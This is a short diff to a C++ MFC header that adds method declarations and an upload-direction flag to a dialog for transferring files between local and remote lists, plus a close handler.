@@ -94,6 +94,16 @@ protected:
 	CWnd*		m_pDropWnd;		//Pointer to window we are dropping on (will be cast to CListCtrl* type)
 
 	void DropItemOnList(CListCtrl* pDragList, CListCtrl* pDropList);
+
+private:
+	bool m_bIsUpload; // 是否是把本地主机传到远程上，标志方向位
+	bool MakeSureDirectoryPathExists(LPCTSTR pszDirPath);
+	void SendTransferMode();
+	void SendFileData();
+	void EndLocalUploadFile();
+	bool DeleteDirectory(LPCTSTR lpszDirectory);
+	void EnableControl(BOOL bEnable = TRUE);
+
 public:
 	afx_msg void OnSize(UINT nType, int cx, int cy);
 	afx_msg void OnNMDblclkListLocal(NMHDR *pNMHDR, LRESULT *pResult);
@@ -105,4 +115,5 @@ public:
 	afx_msg void OnBegindragListRemote(NMHDR *pNMHDR, LRESULT *pResult);
 	afx_msg void OnMouseMove(UINT nFlags, CPoint point);
 	afx_msg void OnLButtonUp(UINT nFlags, CPoint point);
+	afx_msg void OnClose();
 };
